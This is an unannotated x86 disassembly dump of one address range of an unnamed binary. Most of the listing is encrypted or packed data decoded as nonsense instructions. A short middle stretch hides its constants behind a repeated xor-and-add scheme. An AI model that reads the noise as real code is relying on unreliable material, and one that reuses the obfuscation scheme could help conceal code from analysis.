  4262ab:	repz mov al,0xbf
  4262ae:	mov    ah,0xb5
  4262b0:	mov    eax,0xf4c8bb01
  4262b5:	(bad)  
  4262b6:	sti    
  4262b7:	add    al,0xd4
  4262b9:	sar    dh,1
  4262bb:	cli    
  4262bc:	in     eax,0xf
  4262be:	out    dx,eax
  4262bf:	in     eax,0xe5
  4262c1:	add    bl,ch
  4262c3:	xlat   BYTE PTR ds:[ebx]
  4262c4:	loopne 0x426279
  4262c6:	retf   
  4262c7:	int3   
  4262c8:	(bad)  
  4262c9:	shr    ebx,cl
  4262cb:	mov    bh,0xbb
  4262cd:	lock jmp 0x42629b
  4262d0:	fcom   st(1)
  4262d2:	mov    eax,0xd1d3e2fe
  4262d7:	xlat   BYTE PTR ds:[ebx]
  4262d8:	hlt    
  4262d9:	pop    es
  4262da:	add    edx,ecx
  4262dc:	(bad)
  4262df:	(bad)  
  4262e1:	add    esi,eax
  4262e3:	leave  
  4262e4:	faddp  st(1),st
  4262e6:	out    dx,al
  4262e7:	mov    al,0xc7
  4262e9:	fcmovnb st,st(7)
  4262eb:	jmp    0x4262e5
  4262ed:	clc    
  4262ee:	repz (bad) 
  4262f1:	shr    ah,cl
  4262f3:	loopne 0x4262e5
  4262f5:	fidivr DWORD PTR [edi-0x2315fd1e]
  4262fb:	in     eax,0x4
  4262fd:	add    edx,ebp
  4262ff:	retf   
  426300:	in     al,dx
  426301:	adc    esi,DWORD PTR [ebx-0x1b513d2e]
  426307:	(bad)  
  426309:	rol    esi,cl
  42630b:	retf   0xc9f8
  42630e:	mov    ebp,0xfefddaf6
  426313:	call   0xda1a2504
  426318:	cld    
  426319:	fsubrp st(3),st
  42631b:	cmc    
  42631c:	sti    
  42631d:	fsubrp st(1),st
  42631f:	call   0xc30649f0
  426324:	mov    cl,0xf3
  426326:	iret   
  426327:	shl    DWORD PTR [edi-0x213f3a4b],cl
  42632d:	call   0xbf46401e
  426332:	rcr    edx,1
  426334:	not    ebx
  426336:	loop   0x426318
  426338:	ret    
  426339:	fsubr  st,st(2)
  42633b:	xlat   BYTE PTR ds:[ebx]
  42633c:	fimul  DWORD PTR [edi]
  42633e:	add    eax,0xc1d9d9ce
  426343:	mov    eax,0xcecda8dc
  426348:	(bad)  
  426349:	mov    edx,0xdecbced9
  42634e:	leave  
  42634f:	mov    ah,0xd2
  426351:	int    0xb9
  426353:	enter  0xfbe2,0x3
  426357:	(bad)  
  426359:	fcomip st,st(7)
  42635b:	loop   0x426324
  42635d:	idiv   dl
  42635f:	fisttp QWORD PTR ds:0xcbd2bcea
  426365:	repnz loopne 0x42631d
  426368:	fucomi st,st(6)
  42636a:	mov    dl,0xd4
  42636c:	fcom   st(1)
  42636e:	leave  
  42636f:	(bad)  
  426370:	cmc    
  426371:	lock int3 
  426373:	mov    esi,0xc7bfbcf5
  426378:	icebp  
  426379:	rcr    bl,cl
  42637b:	add    al,0xf
  42637d:	(bad)  
  42637e:	or     al,0xe8
  426380:	stc    
  426381:	or     ah,ch
  426383:	ret    0xc2ac
  426386:	leave  
  426387:	mov    dh,0xeb
  426389:	(bad)  
  42638a:	rcl    cl,cl
  42638c:	int    0xd4
  42638e:	in     al,dx
  42638f:	fdivr  st,st(6)
  426391:	ret    
  426392:	repz repnz shl ebx,0xe5
  426397:	int3   
  426398:	cld    
  426399:	cld    
  42639a:	loopne 0x4263a3
  42639c:	add    cl,cl
  42639e:	(bad)  
  4263a0:	pop    es
  4263a1:	or     al,0xd0
  4263a3:	in     al,dx
  4263a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263a5:	ret    
  4263a6:	in     eax,dx
  4263a7:	mov    bl,0xfb
  4263a9:	shl    eax,0xb6
  4263ac:	fcmovne st,st(7)
  4263ae:	mov    ebp,0xf0d4e8d1
  4263b3:	int    0xec
  4263b5:	rcr    ebx,1
  4263b7:	mov    esi,0xe40806c2
  4263bc:	or     ah,bl
  4263be:	(bad)
  4263c1:	in     al,dx
  4263c2:	mov    bl,0xcd
  4263c4:	rol    eax,0xb3
  4263c7:	mov    bh,0xc2
  4263c9:	mov    al,0xb7
  4263cb:	jmp    0xdef3:0xddd8facb
  4263d2:	fild   DWORD PTR [edi]
  4263d4:	add    bl,bl
  4263d6:	repnz out 0xf7,eax
  4263d9:	stc    
  4263da:	out    0xd7,al
  4263dc:	out    0xdb,al
  4263de:	or     al,BYTE PTR ds:0xc0decaca
  4263e4:	mov    al,0xf7
  4263e6:	lods   al,BYTE PTR ds:[esi]
  4263e7:	rcl    esp,1
  4263e9:	aam    0xca
  4263eb:	mov    ecx,0xf6bde4bf
  4263f0:	aad    0x1
  4263f2:	cmc    
  4263f3:	shl    al,0xf3
  4263f6:	hlt    
  4263f7:	clc    
  4263f8:	xlat   BYTE PTR ds:[ebx]
  4263f9:	(bad)  
  4263fb:	fadd   st(6),st
  4263fd:	std    
  4263fe:	retf   
  4263ff:	inc    DWORD PTR [eax]
  426401:	repz mov ecx,0xbde4f0e5
  426407:	jmp    0xd00f51b9
  42640c:	enter  0xd9bb,0xd9
  426410:	jmp    0xcddf:0x1da02fd
  426417:	add    eax,0xf8c7c0f0
  42641c:	fcmovbe st,st(6)
  42641e:	out    dx,eax
  42641f:	add    bh,bh
  426421:	(bad)  
  426423:	shl    DWORD PTR [ebx-0x3c3f331d],1
  426429:	jmp    0xeefb:0xc9d7cec8
  426430:	mov    edx,0xc0dee9f2
  426435:	(bad)  
  426436:	std    
  426437:	add    ebx,edi
  426439:	(bad)  
  42643a:	aad    0xc6
  42643c:	enter  0xdf8,0xd8
  426440:	les    edx,FWORD PTR [ebx]
  426442:	loop   0x426415
  426444:	iret   
  426445:	lock out 0xef,eax
  426448:	jmp    0xd7f9:0xc9ede5d2
  42644f:	mov    ebx,0xf2d9fbf9
  426454:	inc    BYTE PTR [eax]
  426456:	rcl    esp,0xff
  426459:	lock push ebp
  42645c:	iret   
  42645d:	imul   cl
  42645f:	fucomip st,st(4)
  426461:	cld    
  426462:	loopne 0x426455
  426464:	ror    dh,1
  426466:	call   0xc22e4e34
  42646b:	mov    dh,0xb4
  42646d:	shr    esp,1
  42646f:	imul   bl
  426471:	stc    
  426472:	cmc    
  426473:	mov    esp,0xd2c6f5c0
  426478:	jmp    0x42647f
  42647a:	or     al,ch
  42647c:	clc    
  42647d:	aam    0x8
  42647f:	ret    0xd8fa
  426482:	test   al,0xd7
  426484:	in     al,0xf0
  426486:	mul    bl
  426488:	mov    ebx,0xded8e7ca
  42648d:	sti    
  42648e:	retf   0xbfca
  426491:	add    bh,BYTE PTR [esi-0x41d21f9]
  426497:	loop   0x42648e
  426499:	sti    
  42649a:	sub    eax,0x3272fb
  42649f:	xor    eax,0x75108b5
  4264a4:	cmp    eax,0xf89ca5b0
  4264a9:	je     0x42b03e
  4264af:	mov    eax,DWORD PTR [ebp-0x8]
  4264b2:	add    eax,DWORD PTR [ebp-0x80]
  4264b5:	mov    DWORD PTR [ebp-0x84],eax
  4264bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4264be:	sub    eax,DWORD PTR [ebp-0x80]
  4264c1:	mov    DWORD PTR [ebp-0x88],eax
  4264c7:	mov    eax,DWORD PTR [ebp-0x88]
  4264cd:	mov    DWORD PTR [ebp-0x19c],eax
  4264d3:	mov    eax,DWORD PTR [ebp-0x84]
  4264d9:	mov    DWORD PTR [ebp-0x198],eax
  4264df:	mov    DWORD PTR [ebp-0x150],0xf89c85b0
  4264e9:	mov    DWORD PTR [ebp-0x154],0xf89c85b3
  4264f3:	mov    eax,DWORD PTR [ebp-0x150]
  4264f9:	xor    eax,0x75108b5
  4264fe:	add    eax,0x3272fb
  426503:	mov    DWORD PTR [ebp-0x144],eax
  426509:	mov    eax,DWORD PTR [ebp-0x150]
  42650f:	xor    eax,0x75108b5
  426514:	add    eax,0x3272fb
  426519:	mov    DWORD PTR [ebp-0x148],eax
  42651f:	mov    DWORD PTR [ebp-0x14c],0xf89c8590
  426529:	mov    DWORD PTR [ebp-0x158],0xf89c85b9
  426533:	mov    eax,DWORD PTR [ebp-0x19c]
  426539:	mov    ecx,DWORD PTR [ebp-0x150]
  42653f:	xor    ecx,0x75108b5
  426545:	add    ecx,0x3272fb
  42654b:	cmp    eax,ecx
  42654d:	je     0x42b039
  426553:	mov    eax,DWORD PTR [ebp-0x154]
  426559:	xor    eax,0x75108b5
  42655e:	add    eax,0x3272fb
  426563:	mov    ecx,DWORD PTR [ebp-0x144]
  426569:	imul   ecx,eax
  42656c:	mov    eax,DWORD PTR [ebp-0x154]
  426572:	xor    eax,0x75108b5
  426577:	add    eax,0x3272fb
  42657c:	mov    edx,DWORD PTR [ebp-0x19c]
  426582:	sub    edx,eax
  426584:	cmp    ecx,edx
  426586:	ja     0x42b039
  42658c:	mov    eax,DWORD PTR [ebp-0x19c]
  426592:	mov    ecx,DWORD PTR [ebp-0x144]
  426598:	sub    eax,ecx
  42659a:	mov    ecx,DWORD PTR [ebp-0x14c]
  4265a0:	xor    ecx,0x75108b5
  4265a6:	add    ecx,0x3272fb
  4265ac:	xor    edx,edx
  4265ae:	div    ecx
  4265b0:	mov    DWORD PTR [ebp-0x15c],eax
  4265b6:	mov    eax,DWORD PTR [ebp-0x15c]
  4265bc:	mov    ecx,DWORD PTR [ebp-0x158]
  4265c2:	xor    ecx,0x75108b5
  4265c8:	add    ecx,0x3272fb
  4265ce:	cmp    eax,ecx
  4265d0:	jbe    0x4265ec
  4265d6:	mov    eax,DWORD PTR [ebp-0x158]
  4265dc:	xor    eax,0x75108b5
  4265e1:	add    eax,0x3272fb
  4265e6:	mov    DWORD PTR [ebp-0x15c],eax
  4265ec:	mov    eax,DWORD PTR [ebp-0x14c]
  4265f2:	xor    eax,0x75108b5
  4265f7:	add    eax,0x3272fb
  4265fc:	mov    ecx,DWORD PTR [ebp-0x15c]
  426602:	imul   ecx,eax
  426605:	mov    DWORD PTR [ebp-0x148],ecx
  42660b:	mov    eax,DWORD PTR [ebp-0x148]
  426611:	mov    ecx,DWORD PTR [ebp-0x150]
  426617:	xor    ecx,0x75108b5
  42661d:	add    ecx,0x3272fb
  426623:	cmp    eax,ecx
  426625:	je     0x428c70
  42662b:	mov    eax,DWORD PTR [ebp-0x148]
  426631:	mov    DWORD PTR [ebp-0x194],eax
  426637:	mov    eax,DWORD PTR [ebp-0x198]
  42663d:	add    eax,DWORD PTR [ebp-0x144]
  426643:	mov    DWORD PTR [ebp-0x190],eax
  426649:	mov    DWORD PTR [ebp-0x17c],0xf89c85b0
  426653:	mov    DWORD PTR [ebp-0x184],0xf89c85b3
  42665d:	mov    DWORD PTR [ebp-0x170],0xf89c85b2
  426667:	mov    DWORD PTR [ebp-0x16c],0xf89c85bd
  426671:	mov    DWORD PTR [ebp-0x168],0xf89c85b3
  42667b:	mov    eax,DWORD PTR [ebp-0x17c]
  426681:	xor    eax,0x75108b5
  426686:	add    eax,0x3272fb
  42668b:	jmp    0x428a31
  426690:	ffreep st(2)
  426692:	sub    esi,DWORD PTR [esi+esi*1+0x3dd06474]
  426699:	xor    eax,0x4e3b5692
  42669e:	ror    BYTE PTR [ebp+0x73],0x89
  4266a2:	jns    0x42671f
  4266a4:	add    bl,BYTE PTR [eax-0x41018485]
  4266aa:	iret   
  4266ab:	add    eax,0xf2c4f8ff
  4266b0:	lods   al,BYTE PTR ds:[esi]
  4266b1:	in     eax,0xd6
  4266b3:	mov    cl,0xe6
  4266b5:	test   esp,0xd4c7ecef
  4266bb:	out    0xbd,al
  4266bd:	mov    edx,0xdbb9f7bd
  4266c2:	ret    
  4266c3:	icebp  
  4266c4:	ror    esp,cl
  4266c6:	in     eax,0xf4
  4266c8:	ret    0xd9c1
  4266cb:	add    eax,DWORD PTR [edi]
  4266cd:	loopne 0x4266db
  4266cf:	or     eax,esp
  4266d1:	into   
  4266d2:	out    dx,al
  4266d3:	shr    dl,cl
  4266d5:	rcl    ah,0xf4
  4266d8:	clc    
  4266d9:	shl    ah,1
  4266db:	retf   0xe8d7
  4266de:	fdiv   st,st(0)
  4266e0:	out    dx,al
  4266e1:	add    eax,edx
  4266e3:	loope  0x4266cb
  4266e5:	pop    es
  4266e6:	loopne 0x4266b8
  4266e8:	lock ret 0xfdfd
  4266ec:	fadd   DWORD PTR [esi]
  4266ee:	fmul   QWORD PTR [edi]
  4266f0:	mov    ebp,0xd7adcde8
  4266f5:	shl    edi,1
  4266f7:	call   0xd51834e5
  4266fc:	retf   
  4266fd:	clc    
  4266fe:	mov    ecx,0xf9f5edce
  426703:	in     eax,dx
  426704:	fcom   st(7)
  426706:	hlt    
  426707:	(bad)  
  426709:	mov    esi,0xca07c807
  42670e:	or     cl,BYTE PTR [ebx]
  426710:	mov    cl,0xde
  426712:	mov    bh,0xe9
  426714:	shr    dh,cl
  426716:	jecxz  0x4266f8
  426718:	loope  0x4266cb
  42671a:	jmp    0xf9ed:0xdfdbe4be
  426721:	out    dx,al
  426722:	xlat   BYTE PTR ds:[ebx]
  426723:	(bad)  
  426724:	jecxz  0x426705
  426726:	retf   
  426727:	sti    
  426728:	(bad)  
  42672a:	loop   0x426732
  42672c:	retf   
  42672d:	or     al,0xdb
  42672f:	add    ah,ch
  426731:	scas   eax,DWORD PTR es:[edi]
  426732:	(bad)  
  426733:	mov    al,0xdd
  426735:	loop   0x426717
  426737:	into   
  426738:	shr    ch,1
  42673a:	icebp  
  42673b:	jmp    0x426727
  42673d:	mov    ecx,0xf2d4c8f1
  426742:	mov    ch,0x2
  426744:	ret    0xb9f6
  426747:	jmp    0x426749
  426749:	retf   
  42674a:	(bad)  
  42674c:	jmp    0x426747
  42674e:	fstp   st(2)
  426750:	out    dx,eax
  426751:	lods   eax,DWORD PTR ds:[esi]
  426752:	mov    esi,0xb2d0d1b7
  426757:	out    dx,eax
  426758:	mov    dl,0xfb
  42675a:	fadd   st,st(6)
  42675c:	(bad)  
  42675d:	(bad)  
  42675f:	aad    0xbc
  426761:	mov    dh,0xf8
  426763:	xabort 0xf7
  426766:	cmc    
  426767:	(bad)  
  426769:	or     esi,esi
  42676b:	out    0xcf,eax
  42676d:	cli    
  42676e:	fdivp  st(6),st
  426770:	int    0xd7
  426772:	ret    0xeece
  426775:	hlt    
  426776:	xlat   BYTE PTR ds:[ebx]
  426777:	out    0xf6,eax
  426779:	fcmovb st,st(6)
  42677b:	aam    0xcf
  42677d:	call   0xf3104050
  426782:	out    0xfa,eax
  426784:	stc    
  426785:	add    cl,dh
  426787:	jmp    0x4026e66
  42678c:	jmp    0x426789
  42678e:	leave  
  42678f:	bsr    esp,ebx
  426792:	out    0xf0,eax
  426794:	mul    ah
  426796:	call   0xca083b60
  42679b:	mov    ebx,0xdaf1b6f6
  4267a0:	fsubr  st(7),st
  4267a2:	out    dx,eax
  4267a3:	repz fsqrt 
  4267a6:	shl    eax,1
  4267a8:	fcmovu st,st(5)
  4267aa:	add    cl,bh
  4267ac:	enter  0xc8e2,0xcf
  4267b0:	fcomip st,st(0)
  4267b2:	leave  
  4267b3:	shl    bl,cl
  4267b5:	out    dx,al
  4267b6:	mov    ebx,0xadb5d6db
  4267bb:	mov    bh,0xfd
  4267bd:	in     eax,dx
  4267be:	fstp   st(4)
  4267c0:	fcmovu st,st(1)
  4267c2:	into   
  4267c3:	shl    ch,0xe4
  4267c6:	mul    ebp
  4267c8:	aad    0xbe
  4267ca:	clc    
  4267cb:	call   0xcb4f469a
  4267d0:	mov    ebp,0xb2d7a5c9
  4267d5:	cmc    
  4267d6:	(bad)
  4267d9:	idiv   bl
  4267db:	cmc    
  4267dc:	mov    ecx,0xfecdf3f1
  4267e1:	aad    0xdc
  4267e3:	loopne 0x4267a7
  4267e5:	icebp  
  4267e6:	cld    
  4267e7:	stc    
  4267e8:	aad    0xc1
  4267ea:	cld    
  4267eb:	(bad)  
  4267ec:	hlt    
  4267ed:	std    
  4267ee:	repnz fisubr DWORD PTR [ebp-0x3a0d2f38]
  4267f5:	out    0xec,eax
  4267f7:	iret   
  4267f8:	jmp    0x4267e9
  4267fa:	stc    
  4267fb:	mov    ecx,0xd3ffdcd2
  426800:	loope  0x4267ef
  426802:	(bad)  
  426804:	rol    eax,1
  426806:	cmc    
  426807:	(bad)  
  426808:	leave  
  426809:	or     DWORD PTR ds:0xfac6dbe8,eax
  42680f:	std    
  426810:	(bad)  
  426812:	fild   QWORD PTR [esi+esi*4-0x251e4f56]
  426819:	mov    dh,0xb7
  42681b:	ror    ebp,1
  42681d:	in     eax,dx
  42681e:	mov    ecx,0xd5d2dff4
  426823:	rol    BYTE PTR ds:0x5d4dedd,0xf9
  42682a:	iret   
  42682b:	jmp    0x4267f2
  42682d:	adc    ebx,edx
  42682f:	in     al,dx
  426830:	into   
  426831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426832:	les    edi,FWORD PTR [ebp-0x1a0b0e3e]
  426838:	mov    edx,0xeeebdaae
  42683d:	hlt    
  42683e:	mov    ecx,0xdeeffff7
  426843:	add    eax,0xe0bcfafd
  426848:	add    eax,0xe3efdcdf
  42684d:	loop   0x426837
  42684f:	add    al,0xc9
  426851:	in     al,0xa8
  426853:	rol    eax,1
  426855:	scas   al,BYTE PTR es:[edi]
  426856:	loopne 0x426853
  426858:	out    dx,eax
  426859:	enter  0xfbe4,0xc5
  42685d:	int3   
  42685e:	aad    0xfb
  426860:	(bad)  
  426861:	mov    ebp,0xdcc6dc07
  426866:	loope  0x42684e
  426868:	retf   0xd5fa
  42686b:	aam    0xca
  42686d:	loop   0x42685c
  42686f:	shl    dl,cl
  426871:	repnz enter 0xacbd,0xf3
  426876:	mov    al,0xc6
  426878:	out    dx,eax
  426879:	cmc    
  42687a:	(bad)  
  42687b:	jmp    0x426837
  42687d:	xlat   BYTE PTR ds:[ebx]
  42687e:	icebp  
  42687f:	rcr    ch,1
  426881:	add    ch,cl
  426883:	in     eax,0xbe
  426885:	mov    edx,0xe9dfe6d6
  42688a:	sti    
  42688b:	stc    
  42688c:	add    edx,edi
  42688e:	fscale 
  426890:	loopne 0x426869
  426892:	(bad)  
  426893:	(bad)  [esi-0x4e04523a]
  426899:	leave  
  42689a:	iret   
  42689b:	mov    ah,0xba
  42689d:	fdivp  st(0),st
  42689f:	mov    ecx,0x3fffdf5
  4268a4:	add    al,ah
  4268a6:	cld    
  4268a7:	sar    cl,0x2
  4268aa:	fabs   
  4268ac:	add    al,0xf3
  4268ae:	rol    DWORD PTR ds:0xeee1aae2,0xd2
  4268b5:	repnz out 0xb0,eax
  4268b8:	aad    0xff
  4268ba:	mov    ah,0xd1
  4268bc:	f2xm1  
  4268be:	repz fidivr DWORD PTR [edx-0x2611fd2f]
  4268c5:	icebp  
  4268c6:	test   ebx,0xdd0904d7
  4268cc:	mov    dl,0x6
  4268cf:	enter  0xc7ec,0xad
  4268d3:	fucomp st(7)
  4268d5:	in     al,dx
  4268d6:	jmp    0xccf31cd6
  4268db:	mov    edi,0xdcdbfebb
  4268e0:	xlat   BYTE PTR ds:[ebx]
  4268e1:	repz pop es
  4268e3:	rol    BYTE PTR [esi],1
  4268e5:	add    eax,0xf8bfe2c6
  4268ea:	aad    0xfe
  4268ec:	or     eax,0xed05e3fd
  4268f1:	retf   
  4268f2:	(bad)  
  4268f3:	test   al,0xb2
  4268f5:	out    0xe7,eax
  4268f7:	mov    bl,0xec
  4268f9:	mov    ecx,0xc4d1ede7
  4268fe:	enter  0xc1bc,0xec
  426902:	mov    eax,0xd2fefabf
  426907:	in     eax,0xb
  426909:	dec    DWORD PTR [eax]
  42690b:	add    al,0xc7
  42690d:	or     eax,0xebcdc9fb
  426912:	les    ebp,FWORD PTR [eax-0x82d431f]
  426918:	mov    ecx,0xdbb4d4fb
  42691d:	in     al,0xf2
  42691f:	repz in al,dx
  426921:	mov    esi,0x2c6f2d9
  426926:	sar    ecx,1
  426928:	cli    
  426929:	or     DWORD PTR [edx],ecx
  42692b:	cli    
  42692c:	ret    
  42692d:	retf   0xd9fb
  426930:	mov    esi,0xc4c4e7ea
  426935:	shr    dl,cl
  426937:	mov    edx,0xd1d1b2cc
  42693c:	fdivrp st(1),st
  42693e:	retf   0xf4c8
  426941:	loopne 0x4268f8
  426943:	cmc    
  426944:	cmc    
  426945:	out    0x5,al
  426947:	pop    es
  426948:	(bad)  
  426949:	cld    
  42694a:	out    dx,al
  42694b:	or     eax,DWORD PTR [edx]
  42694d:	enter  0xdefa,0xd2
  426951:	mov    bl,0xe2
  426953:	cmc    
  426954:	hlt    
  426955:	ret    0xd4ed
  426958:	lock out 0xf4,eax
  42695b:	fdivr  DWORD PTR [edx-0x4043432c]
  426961:	hlt    
  426962:	out    0xc7,eax
  426964:	in     eax,dx
  426965:	add    al,BYTE PTR [edx]
  426967:	frndint 
  426969:	add    al,0xc9
  42696b:	fucomp st(0)
  42696d:	add    al,0xeb
  42696f:	pop    es
  426970:	ret    
  426971:	sar    BYTE PTR [ebp-0xe1e0e16],cl
  426977:	(bad)  
  426978:	clc    
  426979:	aam    0xad
  42697b:	jmp    0xce062955
  426980:	mov    bh,0xb9
  426982:	repnz fcomi st,st(5)
  426985:	fcmovbe st,st(4)
  426987:	stc    
  426988:	lock add DWORD PTR ds:0xd8cef9e5,eax
  42698f:	or     edx,eax
  426991:	fucomp st(2)
  426993:	mov    dl,0xf5
  426995:	mov    cl,0xcc
  426997:	shl    bh,1
  426999:	jmp    0xd21e5d63
  42699e:	(bad)  
  42699f:	sar    ah,1
  4269a1:	add    esp,edi
  4269a3:	mov    edi,0x1b9e0f2
  4269a8:	fisttp WORD PTR [ecx]
  4269aa:	loope  0x426984
  4269ac:	fldlg2 
  4269ae:	fucomi st,st(5)
  4269b0:	out    0xe6,al
  4269b2:	shl    cl,0xe2
  4269b5:	mov    dh,0xbb
  4269b7:	stc    
  4269b8:	mov    dh,0xb7
  4269ba:	fcmovnbe st,st(6)
  4269bc:	fdivr  st(0),st
  4269be:	iret   
  4269bf:	fstp   TBYTE PTR [ecx-0xb3c1026]
  4269c5:	aad    0xd5
  4269c7:	fcomp  st(4)
  4269c9:	cmc    
  4269ca:	retf   
  4269cb:	clc    
  4269cc:	fcmovnu st,st(4)
  4269ce:	adc    ecx,edx
  4269d0:	repz mov ebp,0xadd6f1ca
  4269d6:	repnz int3 
  4269d8:	out    0xea,al
  4269da:	fucomi st,st(7)
  4269dc:	repz (bad) 
  4269de:	clc    
  4269df:	cld    
  4269e0:	call   0xfb044ad7
  4269e5:	aam    0xc0
  4269e7:	add    cl,bl
  4269e9:	loopne 0x4269da
  4269eb:	in     al,0xe1
  4269ed:	push   cs
  4269ee:	out    dx,al
  4269ef:	add    BYTE PTR [eax-0x132a1a54],ch
  4269f5:	(bad)
  4269f8:	loope  0x4269b4
  4269fa:	aam    0xbb
  4269fc:	(bad)  
  4269fe:	test   ch,0xf5
  426a01:	lock fcomi st,st(6)
  426a04:	add    BYTE PTR [ebx],cl
  426a06:	icebp  
  426a07:	out    0xd0,eax
  426a09:	out    0xd9,al
  426a0b:	(bad)  
  426a0c:	out    dx,eax
  426a0d:	or     esp,ebx
  426a0f:	shr    BYTE PTR [ebp-0x4f4c2310],0xcc
  426a16:	loop   0x4269ed
  426a18:	mov    ecx,0xedfae4ea
  426a1d:	lock leave 
  426a1f:	clc    
  426a20:	leave  
  426a21:	(bad)  
  426a22:	shl    eax,cl
  426a24:	xlat   BYTE PTR ds:[ebx]
  426a25:	add    ah,dl
  426a27:	fdiv   st(2),st
  426a29:	retf   
  426a2a:	jmp    0x426a35
  426a2c:	fcmovnb st,st(2)
  426a2e:	out    0xe2,al
  426a30:	out    0xbc,al
  426a32:	jmp    0xc1d1:0xe5e5cacb
  426a39:	mov    ah,0xd0
  426a3b:	mov    ebx,0xf3eef3f4
  426a40:	iret   
  426a41:	into   
  426a42:	iret   
  426a43:	jecxz  0x426a2b
  426a45:	aad    0xdb
  426a47:	add    eax,DWORD PTR ds:0xcefdae2
  426a4d:	(bad)  ds:0xa5ded0e1
  426a53:	loop   0x426a3b
  426a55:	loope  0x426a3a
  426a57:	mov    ch,0xda
  426a59:	mov    cl,0xc6
  426a5b:	mov    edx,0xfcc3c8dd
  426a60:	rol    DWORD PTR [edx],1
  426a62:	icebp  
  426a63:	in     eax,dx
  426a64:	loopne 0x426a60
  426a66:	(bad)  
  426a67:	jmp    0xe1a4842
  426a6c:	out    dx,eax
  426a6d:	in     eax,dx
  426a6e:	leave  
  426a6f:	stc    
  426a70:	retf   
  426a71:	jmp    0xf419391b
  426a76:	jmp    0xec35656d
  426a7b:	clc    
  426a7c:	hlt    
  426a7d:	fidiv  WORD PTR [edi+edi*4-0x1ff2b24]
  426a84:	(bad)  
  426a85:	cld    
  426a86:	ret    
  426a87:	xlat   BYTE PTR ds:[ebx]
  426a88:	or     edx,esi
  426a8a:	add    ch,cl
  426a8c:	inc    DWORD PTR [esi]
  426a8e:	out    dx,eax
  426a8f:	(bad)  
  426a90:	shr    bh,cl
  426a92:	jmp    0xee343483
  426a97:	mov    dh,0xc5
  426a99:	out    0xbf,eax
  426a9b:	bnd call 0xdb1c466d
  426aa1:	rcl    al,1
  426aa3:	in     eax,dx
  426aa4:	(bad)  
  426aa6:	fdivrp st(5),st
  426aa8:	add    eax,ebp
  426aaa:	loopne 0x426ab3
  426aac:	fadd   st,st(2)
  426aae:	iret   
  426aaf:	cli    
  426ab0:	shl    BYTE PTR [ebx-0x2c0c1658],1
  426ab6:	ror    ebp,0xc8
  426ab9:	fbstp  TBYTE PTR [ecx+esi*8-0x4f23102d]
  426ac0:	iret   
  426ac1:	shl    al,0xe3
  426ac4:	ret    0xf8f8
  426ac7:	or     ebp,ebx
  426ac9:	(bad)  
  426acb:	jecxz  0x426a93
  426acd:	or     ecx,DWORD PTR [edx]
  426acf:	loope  0x426a7b
  426ad1:	in     eax,0xdf
  426ad3:	shl    ch,1
  426ad5:	(bad)
  426ad8:	mov    ecx,0xfcbac8c6
  426add:	mov    edi,0x2f5e8fd
  426ae2:	shl    esi,0xd8
  426ae5:	fcmovu st,st(6)
  426ae7:	pop    es
  426ae8:	mov    edi,0xe300dae1
  426aed:	or     DWORD PTR [esi],ecx
  426aef:	out    dx,eax
  426af0:	test   al,0xcd
  426af2:	lods   al,BYTE PTR ds:[esi]
  426af3:	out    0xf0,eax
  426af5:	mov    bh,0xd6
  426af7:	(bad)  
  426af8:	in     eax,dx
  426af9:	shr    eax,1
  426afb:	aad    0xf0
  426afd:	std    
  426afe:	cmc    
  426aff:	(bad)  
  426b01:	in     eax,dx
  426b02:	int    0xe7
  426b04:	cli    
  426b05:	in     al,0xfc
  426b07:	fiadd  WORD PTR [edx]
  426b09:	(bad)  
  426b0a:	retf   0xf9db
  426b0d:	out    dx,eax
  426b0e:	out    0xc0,al
  426b10:	shl    ecx,0xca
  426b13:	jmp    0xf12d5de5
  426b18:	out    dx,al
  426b19:	mov    edx,0xe8d1dbca
  426b1e:	call   0xd43d2306
  426b23:	add    cl,ah
  426b25:	(bad)  
  426b26:	or     edi,esi
  426b28:	stc    
  426b29:	ret    0xfaca
  426b2c:	(bad)  
  426b2e:	add    ah,al
  426b30:	retf   
  426b31:	in     eax,dx
  426b32:	rcr    esi,0xea
  426b35:	in     al,0xec
  426b37:	(bad)  
  426b38:	mov    edx,0xeeb4f4d6
  426b3d:	in     eax,dx
  426b3e:	fxch   st(7)
  426b40:	shl    ebx,1
  426b42:	mov    esi,0xe1f804e3
  426b47:	sar    edi,0x2
  426b4a:	iret   
  426b4b:	(bad)  
  426b4d:	(bad)  
  426b4f:	loop   0x426b0e
  426b51:	(bad)  
  426b53:	jmp    0x426b49
  426b55:	in     al,dx
  426b56:	imul   eax
  426b58:	out    0xe6,al
  426b5a:	lock fidiv DWORD PTR [ebp-0x45370635]
  426b61:	fucomi st,st(5)
  426b63:	int    0xc1
  426b65:	rol    edx,0xd9
  426b68:	add    eax,0xd804c501
  426b6d:	retf   
  426b6e:	or     eax,0xb1c0ed04
  426b73:	scas   eax,DWORD PTR es:[edi]
  426b74:	imul   ebx
  426b76:	shr    BYTE PTR [eax-0x53491749],0xdc
  426b7d:	mov    ah,0xca
  426b7f:	mov    ecx,0xecc7dfb7
  426b84:	inc    al
  426b86:	stc    
  426b87:	(bad)  
  426b89:	cli    
  426b8a:	out    0x5,al
  426b8c:	jecxz  0x426b6b
  426b8e:	int3   
  426b8f:	fdivr  QWORD PTR [ebx+esi*8-0xf37091f]
  426b96:	lods   eax,DWORD PTR ds:[esi]
  426b97:	fxch   st(4)
  426b99:	leave  
  426b9a:	jmp    0xdd2f226f
  426b9f:	loope  0x426b98
  426ba1:	ret    
  426ba2:	cld    
  426ba3:	(bad)  
  426ba4:	rol    ah,cl
  426ba6:	mov    DWORD PTR [esi],0xe2d8ffe9
  426bac:	enter  0xfdc,0x8
  426bb0:	scas   eax,DWORD PTR es:[edi]
  426bb1:	fsubp  st(5),st
  426bb3:	shr    esp,cl
  426bb5:	aam    0xe5
  426bb7:	mov    cl,0xe0
  426bb9:	(bad)  
  426bba:	retf   0xc9e9
  426bbd:	rcl    ch,cl
  426bbf:	leave  
  426bc0:	int3   
  426bc1:	test   dh,0xb8
  426bc4:	rol    bl,cl
  426bc6:	sti    
  426bc7:	fcomip st,st(0)
  426bc9:	jmp    0xcee4:0x1d8bc0a
  426bd0:	fadd   st(0),st
  426bd2:	mov    al,0xf5
  426bd4:	repz retf 
  426bd6:	mov    dl,0xb7
  426bd8:	out    dx,al
  426bd9:	jmp    0xba196ab4
  426bde:	sar    DWORD PTR [eax+0xfceed9],1
  426be4:	shl    ch,1
  426be6:	xlat   BYTE PTR ds:[ebx]
  426be7:	retf   0xfde5
  426bea:	jmp    0xfe0e51f5
  426bef:	repz in al,0xc5
